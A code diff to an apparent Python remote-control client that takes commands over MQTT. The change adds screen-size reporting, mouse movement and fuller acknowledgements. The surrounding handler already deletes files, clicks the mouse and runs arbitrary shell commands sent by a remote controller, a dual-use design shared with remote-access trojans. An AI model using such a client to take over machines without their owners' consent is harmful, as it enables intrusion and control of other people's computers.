@@ -113,7 +113,9 @@ def handle_msg(msg):
         elif msg == "click":
             pg.click()   
         elif msg == "doubleclick":
-            pg.doubleClick()  
+            pg.doubleClick()
+        elif msg == "getscreensize":
+            client.publish(ACK_TOPIC,f"SCREEN SIZE OF : {pc_id} :--> {pg.size()}")    
         elif msg == "displayoff":
             display_off()
         elif msg == "displayon":
@@ -224,7 +226,13 @@ def handle_msg(msg):
                 def delete():
                     dataread=delete_file(parts[0],parts[1])
                     client.publish(ACK_TOPIC,f"File Delete :---> {dataread}")
-                safe_thread(delete)                
+                safe_thread(delete)         
+        elif msg.startswith("moveto"):
+            parts = msg[len("moveto "):].split()
+            if len(parts) == 2:
+                def move():
+                    pg.moveTo(int(parts[0]),int(parts[1]),0.2)
+                safe_thread(move)              
 
         elif msg.startswith("cmdwithoutput"):
             cmd = msg[len("cmdwithoutput "):]
@@ -264,7 +272,7 @@ def on_message(client, userdata, msg):
     message = msg.payload.decode()
     print(f"Received: {message}")
     handle_msg(message)
-    client.publish(ACK_TOPIC, f"ACK:{pc_id}")
+    client.publish(ACK_TOPIC, f"ACK:{pc_id} : RECIEVED [ {message} ]")
 
 # MQTT client setup
 client = mqtt.Client()
